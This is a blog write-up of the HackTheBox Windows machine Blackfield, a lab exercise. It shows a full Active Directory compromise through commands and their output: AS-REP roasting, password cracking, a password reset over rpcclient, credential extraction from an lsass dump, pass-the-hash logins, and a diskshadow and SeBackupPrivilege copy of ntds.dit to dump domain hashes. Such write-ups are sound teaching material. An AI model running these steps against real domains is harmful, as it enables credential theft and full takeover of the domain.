---
title: "HackTheBox: Blackfield Writeup"
date: 2020-11-10 09:45:00 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - English
---

The box this time (*not the box of the week since im far behind HTB retirement schedule by now*) is Blackfield from HackTheBox, its a Windows box with the difficulty rating Hard. 

To root this machine we have to acquire a list of users through **SMB**, perform an **ASREP-Roast**, find a way to pivot to another user via **rpcclient**, extract hashed passwords from a **memory dump**. And finally using Active Directory privileges to get our hands on the **ntdis.dit** database and dump administrator hashes.

![Blackfield Info](https://jackhack.se/assets/images/blackfield/blackfield_info.png)



# Recon

~~~
# Nmap 7.80 scan initiated Mon Jul 20 05:19:06 2020 as: nmap -sC -sV -o blackfield -Pn blackfield.htb
Nmap scan report for blackfield.htb (10.10.10.192)
Host is up (0.052s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-20 16:24:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/20%Time=5F15619D%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h05m05s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-20T16:26:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 20 05:22:18 2020 -- 1 IP address (1 host up) scanned in 191.42 seconds
~~~
{: .language-bash}

The results from nmap points to this being a domain controller since it runs DNS, Kerberos, SMB & LDAP. I usually start by SMB enumeration if possible since there is often something left in the open for me to read.

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ smbclient -L 10.10.10.192                                     
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
~~~
{: .language-bash}

I am not allowed to list the forensics share, but let's have a look at the hidden profiles$ share.

~~~
┌──(kali@kali)-[~/boxes/blackfield]                                                                                       
└─$ smbclient //10.10.10.192/profiles$                              
Enter WORKGROUP\kali's password:                                                                                     
Try "help" to get a list of possible commands.                                                                       
smb: \> dir                                                                                                          
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
------------------------------- snip -------------------------------------
~~~
{: .language-bash}

This should be a list of all user profiles in the domain, so i added all of these possible accounts into a file called users.txt since there was 300+ possible users.

As mentioned regarding the nmap scan, i noticed kerberos was running, kerberos is an authentication system frequently used in Windows Active Directory. 

ASREP-roasting is a technique related to the popular term of kerberoasting, kerberoasting in theory is explained in more detail [here](https://www.tarlogic.com/en/blog/how-kerberos-works/). And more practial attack scenarios can be learned [here](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

>The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline. 

Using a tool called GetNPUsers.py from [Impacket](https://github.com/SecureAuthCorp/impacket) we can feed the tool with the userlist and hopefully return a crackable kerberos TGT. 

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ python3 GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -format john -outputfile ASREP_HASHES -dc-ip 10.10.10.192  
~~~
{: .language-bash}

After going trough each user in the list i end up with the account *support* in the ASREP_HASHES file.

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ cat ASREP_HASHES
$krb5asrep$support@BLACKFIELD.LOCAL:1708e1f9f7b7ade649039397c92d8a44$f37ee1b281af963557e814c3639235b434dcecd052eef83fca2191136e67f721bbac5f3c8b7c935da71a2eb127c810c1fe403307085dc4aff4e6462b69ad4c72c377a626deba3bcde148fddba3410e7f00c5d85d99823ec35d6ae2644c659e5c9364e013bda02856b55118856d4e3ba590e5f4129d01464c46a73492de7f4012b3259cb951d27ed379914c38c65886ead3a72d6038a3e945ddf58b6ff51bc8208972b8a2a6d13e87e6256132117cdaab27dbf55f17a91c9fd3f6939ec9794a6bbb57dbd25195f41c8e2af4901831046080578635dbe745d2e2e188bb8ccfa8776e54209bc96159f6da9880ef40fbf3b768d78500
~~~
{: .language-bash}

As i specified when running GetNPUsers, the tool gave me the hash in John-format, so i can use John to crack it.

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ sudo john ASREP_HASHES --wordlist=/usr/share/wordlists/rockyou.txt                         
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)
1g 0:00:00:20 DONE (2020-11-04 15:15) 0.04821g/s 691175p/s 691175c/s 691175C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed

~~~
{: .language-bash}

So the password for the user *support* is *#00^BlackKnight*


# User

While trying to get a shell, i failed. The only thing i could connect to with these new credentials was *rpcclient*

The hint in this one is the account name *support* somehow i am supposed to be able to help users with various things. After some googleing i found out we can actually change user password through rpcclient, this is explained in this [article](https://malicious.link/post/2017/reset-ad-user-password-with-linux/).

By connecting to rpcclient and running *enumdomusers* i could list all active domain accounts.

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ rpcclient 10.10.10.192 -U support
Enter WORKGROUP\support's password:                                               

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]  
user:[Guest] rid:[0x1f5]                                 
user:[krbtgt] rid:[0x1f6]                                 
user:[audit2020] rid:[0x44f] 
....
....
user:[support] rid:[0x450]                                       user:[svc_backup] rid:[0x585]                           
user:[lydericlefebvre] rid:[0x586]                                     
~~~
{: .language-bash}

Trying a few users i finally managed to set a new password for the user *audit2020*

~~~
rpcclient $> setuserinfo2 svc_backup 23 "Yaagn123"
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
rpcclient $> setuserinfo2 audit2020 23 "Yaagn123"
rpcclient $> 
~~~
{: .language-bash}

Going back to the SMB shares i remember there was one share called "forensic" and this *audit2020* user seems to be a user left over from some kind of security audit. 

I proceeded by connecting to the share and download all of it's files.

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ smbclient //10.10.10.192/forensic -U audit2020                                                                    
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 4103703 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget * 
getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (5.3 KiloBytes/sec) (average 3.8 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (85.5 KiloBytes/sec) (average 30.5 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (1375.2 KiloBytes/sec) (average 555.8 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (9.6 KiloBytes/sec) (average 467.4 KiloBytes/sec)
.....
~~~
{: .language-bash}

Looking through the files downloaded, i quickly notice *lsass.zip* inside the directory *memory_analysis*, peeking inside the zip file i can tell there is a process dump of the lsass process, i should be able to extract passwords from that dump using mimikatz.

LSASS stands for **Local Security Authority Subsystem Service**, and is a process running in Windows operating systems that is responsible for a lot of things regarding security and authorization, it verifies logins, handles password changes and provides access tokens etc. 

~~~
┌──(kali@kali)-[~/boxes/blackfield/memory_analysis]
└─$ ls -la        
total 228116
drwxr-xr-x 2 kali kali     4096 Nov  8 16:41 .
drwxr-xr-x 7 kali kali     4096 Oct 31 18:02 ..
-rw-r--r-- 1 kali kali 37876530 Nov  8 16:40 conhost.zip
-rw-r--r-- 1 kali kali 24962333 Nov  8 16:40 ctfmon.zip
-rw-r--r-- 1 kali kali 23993305 Nov  8 16:40 dfsrs.zip
-rw-r--r-- 1 kali kali 18366396 Nov  8 16:40 dllhost.zip
-rw-r--r-- 1 kali kali  8810157 Nov  8 16:40 ismserv.zip
-rw-r--r-- 1 kali kali 41936098 Nov  8 16:41 lsass.zip
-rw-r--r-- 1 kali kali 64288607 Nov  8 16:41 mmc.zip
-rw-r--r-- 1 kali kali 13332174 Nov  8 16:41 RuntimeBroker.zip
-rw-r--r-- 1 kali kali        0 Nov  8 16:41 ServerManager.zip
                                                                                                                                                                                                                                           
┌──(kali@kali)-[~/boxes/blackfield/memory_analysis]
└─$ unzip -l lsass.zip 
Archive:  lsass.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
143044222  2020-02-23 11:02   lsass.DMP
---------                     -------
143044222                     1 file

~~~
{: .language-bash}

Not going to try to get mimikatz working on Kali, so i went with the Python implementation called pypykatz.

~~~
┌──(kali@kali)-[~/boxes/blackfield]            
└─$ pypykatz lsa minidump lsass.DMP                               
                                                                 INFO:root:Parsing file lsass.DMP                                                                                     
FILE: ======== lsass.DMP =======                                                                                     
== LogonSession ==                                                                                                   
authentication_id 406458 (633ba)                                                                                                                                                                                                           
session_id 2                                                                                                                                                                                                                               
username svc_backup                                       
domainname BLACKFIELD                                                                                                
logon_server DC01                                                                                                                                                                                                                          
logon_time 2020-02-23T18:00:03.423728+00:00                                                                                                                                                                                                
sid S-1-5-21-4194615774-2175524697-3563712290-1413                                                                   
luid 406458                                         
        == MSV ==                                                                                                                                                                                                                          
                Username: svc_backup                                                                                                                                                                                                       
                Domain: BLACKFIELD                                                                                                                                                                                                         
                LM: NA                                                                                                                                                                                                                     
                NT: 9658d1d1dcd9250115e2205d9f48400d                                                                                                                                                                                       
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c                                                       
        == WDIGEST [633ba]==                                                                                         
                username svc_backup  
                domainname BLACKFIELD                                                                                
                password None                             
        == SSP [633ba]==
~~~
{: .language-bash}

The first entry in the output gives me a NTLM hash, if i want to i could try cracking the hash, but i will try to get a shell as the user *svc_backup* with Evil-Winrm using the Pass-The-Hash technique, using the hash to authenticate myself. 

~~~
┌──(kali㉿kali)-[~/boxes/blackfield]                             
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                 

Evil-WinRM shell v2.3                                                                                
Info: Establishing connection to remote endpoint                 

*Evil-WinRM* PS C:\Users\svc_backup> cd Desktop                                                                        
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> more user.txt                                  
2765c9f24af1c3f1188e074988b1a493 
~~~
{: .language-bash}

It worked and i could successfully get the user flag.

# Root

One of the first things i do when i acquire a new account is check what privileges i have.

~~~
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413

... SNIP ...


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
~~~
{: .language-bash}

The intresting part here is **SeBackUpPrivilege** and  **SeRestorePrivilege**, with these privileges enabled i could make a shadowcopy of the whole domain controller. From that shadowcopy i can download the NTDS.dit file, and together with the SYSTEM *hive* from the Windows registry these can be used to dump the administrator hash. 

The processes of this attack is described [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group) 

### NTDS

NTDS.dit is a database file that stores Active Directory data, such as users, objects, groups, OUs and hashed passwords. One cannot simply download the file into a remote machine since it is constantly in use by the Active Directory and is therefore locked. There are alot of methods to get around this lock, but i decided to use the shadowcopy method. 

The NTDS database is encrypted with the *BootKey* of the system, and in order to decrypt it we also have to retrieve the boot key from the *system hive* in the Windows registry.

To make a shadowcopy of the domain controller i will use the utility *diskshadow*, diskshadow can take a script as input so i wrote..(nope, i stole it from the internet) a script like this.

~~~
set context persistent nowriters
set metadata C:\temp\metadata.cab
add volume c: alias yaagn
create
expose %yaagn% z:
~~~
{: .language-bash}



This will make a shadowcopy and expose it at the Z: drive, after it's done i can now copy the ntds file to my temporary directory on the box

I want to use the SeBackupPrivilege commands to be able to copy the ntds database, so i have to upload them to the box and then import them into powershell first. The DLLs are available [here](https://github.com/giuliano108/SeBackupPrivilege)

~~~
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
~~~

~~~
*Evil-WinRM* PS C:\temp> diskshadow /s script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  11/8/2020 10:42:16 PM

-> set context persistent nowriters
-> set metadata C:\temp\metadata.cab
-> add volume c: alias yaagn
-> create
Alias yaagn for shadow ID {4273f94b-9616-406e-a375-ec9a46237a76} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {99ee7839-4a45-4984-aba0-4a82867fb7d0} set as environment variable.

Querying all shadow copies with the shadow copy set ID {99ee7839-4a45-4984-aba0-4a82867fb7d0}

        * Shadow copy ID = {4273f94b-9616-406e-a375-ec9a46237a76}               %yaagn%
                - Shadow copy set: {99ee7839-4a45-4984-aba0-4a82867fb7d0}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 11/8/2020 10:42:17 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %yaagn% z:
-> %yaagn% = {4273f94b-9616-406e-a375-ec9a46237a76}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\temp> Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit c:\temp\ntds.dit
*Evil-WinRM* PS C:\temp> download ntds.dit
Info: Downloading C:\temp\ntds.dit to ntds.dit

                                                             
Info: Download successful!
~~~
{: .language-bash}

Then i can dump the system hive with a simple one line command, and download it to my Kali box

~~~
*Evil-WinRM* PS C:\temp> reg save HKLM\SYSTEM C:\temp\system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\temp> download system.hive
~~~
{: .language-bash}

Back at my Kali box, i can now use another tool from Impacket, called *secretsdump.py* and retrieve the hashes

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL                                                                                                                                                                        
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation                                                                                                                                                                                   
                                                                                                                                                                                                                                           
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                                                                                                                                                              
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                              
[*] Searching for pekList, be patient                                                                                                                                                                                                      
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                                                                                                                                          
[*] Reading and decrypting hashes from ntds.dit                                                                                                                                                                                            
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::                                                                                  
~~~
{: .language-bash}

Once again i could use the hash to authenticate as the Administrator account and catch the root flag!

~~~
┌──(kali@kali)-[~/boxes/blackfield]
└─$ evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
5de6035c96bfa1b51b18abc29684289d
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
~~~
{: .language-bash}

# Resources
Resources is where i will put links without context used while solving the boxes, these can be used to further understand parts of the writeup :)

* https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html#-dump-ntdsdit
* https://roberthosborne.com/privesc
* https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf

